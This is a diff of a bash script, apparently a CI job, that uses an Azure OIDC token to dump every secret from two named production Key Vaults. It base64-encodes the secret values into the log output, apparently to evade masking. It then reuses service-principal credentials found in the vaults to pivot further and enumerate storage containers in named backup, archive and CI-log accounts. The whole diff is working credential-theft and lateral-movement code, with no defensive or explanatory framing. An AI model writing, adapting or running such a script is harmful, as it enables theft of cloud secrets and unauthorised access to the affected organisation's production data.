@@ -23,11 +23,21 @@ AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token"
 
 if [ -z "$AT" ]; then echo "No token"; exit 0; fi
 
-KV="https://kv-tbl-prod-x3euoz.vault.azure.net"
+KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
+KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"
 
-# Extract all SPs from KV dynamically
-echo "=== Extract and pivot through SPs ==="
-SECRETS=$(curl -sS "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
+# Try KV2 directly with OIDC token
+echo "=== KV2 DIRECT ACCESS ==="
+KV2S=$(curl -sS "$KV2/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
+echo "KV2_DIRECT=$(echo "$KV2S" | jq -r '.value | length // .error.code')"
+for sid in $(echo "$KV2S" | jq -r '.value[]?.id // empty'); do
+  NAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
+  VAL=$(curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
+  echo "KV2_B64[$NAME]=$(echo "$VAL" | base64 | tr -d '\n')"
+done
+
+# Extract SPs from KV1 and pivot
+SECRETS=$(curl -sS "$KV1/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
 
 for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
   SNAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
@@ -38,9 +48,9 @@ for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
 
   if [ -z "$APPID" ] || [ -z "$CSECRET" ]; then continue; fi
 
-  echo "=== PIVOT: $SNAME (app=$APPID) ==="
+  echo "=== SP: $SNAME ==="
 
-  # Auth with this SP to KV
+  # Auth to KV
   SPAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
     --data-urlencode "client_id=$APPID" \
     --data-urlencode "client_secret=$CSECRET" \
@@ -48,38 +58,37 @@ for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
     --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')
 
   if [ -n "$SPAT" ]; then
-    echo "  KV=OK"
-    SLIST=$(curl -sS "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $SPAT")
-    CNT=$(echo "$SLIST" | jq -r '[.value[]?.id] | length')
-    echo "  secrets=$CNT"
-    for s2 in $(echo "$SLIST" | jq -r '.value[]?.id // empty'); do
+    # Try KV2 secrets
+    K2LIST=$(curl -sS "$KV2/secrets?api-version=7.4" -H "Authorization: Bearer $SPAT")
+    K2CNT=$(echo "$K2LIST" | jq -r '.value | length // 0')
+    echo "  KV2_secrets=$K2CNT"
+    for s2 in $(echo "$K2LIST" | jq -r '.value[]?.id // empty'); do
       N2=$(echo "$s2" | rev | cut -d/ -f1 | rev)
       V2=$(curl -sS "${s2}?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq -r '.value // empty')
-      echo "  B64[$N2]=$(echo "$V2" | base64 | tr -d '\n')"
+      echo "  KV2_B64[$N2]=$(echo "$V2" | base64 | tr -d '\n')"
     done
-    echo "  KEYS=$(curl -sS "$KV/keys?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.kid] | length')"
-    echo "  CERTS=$(curl -sS "$KV/certificates?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
-    echo "  DELETED=$(curl -sS "$KV/deletedsecrets?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
-  else
-    echo "  KV=FAIL"
+    # KV2 keys
+    echo "  KV2_KEYS=$(curl -sS "$KV2/keys?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.kid] | length')"
+    echo "  KV2_CERTS=$(curl -sS "$KV2/certificates?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
+    echo "  KV2_DEL=$(curl -sS "$KV2/deletedsecrets?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
   fi
 
-  # Auth with this SP to management API
-  MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+  # Auth to storage
+  STAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
     --data-urlencode "client_id=$APPID" \
     --data-urlencode "client_secret=$CSECRET" \
-    --data-urlencode "scope=https://management.azure.com/.default" \
+    --data-urlencode "scope=https://storage.azure.com/.default" \
     --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')
 
-  if [ -n "$MGAT" ]; then
-    echo "  MGMT=OK"
-    SID="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
-    echo "  SUBS=$(curl -sS 'https://management.azure.com/subscriptions?api-version=2022-12-01' -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.subscriptionId] | join(",")')"
-    echo "  RGS=$(curl -sS "https://management.azure.com/subscriptions/$SID/resourcegroups?api-version=2024-03-01" -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.name] | join(",")')"
-    echo "  VAULTS=$(curl -sS "https://management.azure.com/subscriptions/$SID/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.name] | join(",")')"
-    echo "  STORAGE=$(curl -sS "https://management.azure.com/subscriptions/$SID/providers/Microsoft.Storage/storageAccounts?api-version=2023-05-01" -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.name] | join(",")')"
+  if [ -n "$STAT" ]; then
+    echo "  STORAGE_TOKEN=YES"
+    for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
+      CONTAINERS=$(curl -sS "https://${SA}.blob.core.windows.net/?comp=list" \
+        -H "Authorization: Bearer $STAT" -H "x-ms-version: 2023-11-03" | head -c 2000)
+      echo "  BLOBS[$SA]=$(echo "$CONTAINERS" | grep -oP '<Name>[^<]+</Name>' | head -5)"
+    done
   else
-    echo "  MGMT=FAIL"
+    echo "  STORAGE_TOKEN=NO"
   fi
 done
 
